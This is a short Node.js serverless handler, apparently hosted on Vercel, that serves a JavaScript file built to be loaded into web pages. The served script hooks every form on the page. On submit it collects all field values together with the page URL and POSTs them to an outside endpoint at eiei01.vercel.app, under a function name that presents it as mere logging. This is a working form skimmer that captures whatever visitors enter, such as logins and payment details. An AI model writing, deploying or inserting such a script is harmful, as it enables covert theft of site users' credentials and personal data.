module.exports = (req, res) => {

    const scriptContent = `
document.addEventListener('DOMContentLoaded', function () {
  function logFormSubmission(event) {
      // event.preventDefault();

      const formData = new FormData(event.target);
      const formObject = {};
      formData.forEach((value, key) => {
          formObject[key] = value;
      });
      console.log('Form Data:', formObject);
      fetch('https://eiei01.vercel.app/api/jookgru', {
          method: 'POST',
          headers: {
              'Content-Type': 'application/json',
          },
          body: JSON.stringify({
              url: window.location.href,
              data: formObject,
          }),
      })
      .then(response => {
          console.log('Response Headers:', response.headers);
          return response.text(); 
      })
      .then(text => {
          console.log('Server response text:', text);

      })
      .catch(error => {
          console.error('There was a problem with the fetch operation:', error);
      });
  }

  // Attach the submit event listener to all forms on the page
  var forms = document.querySelectorAll('form');
  forms.forEach(function (form) {
      form.addEventListener('submit', logFormSubmission);
  });
}); `;
    res.set('Cache-Control', 'no-store');
    res.type('text/javascript').send(scriptContent);
}

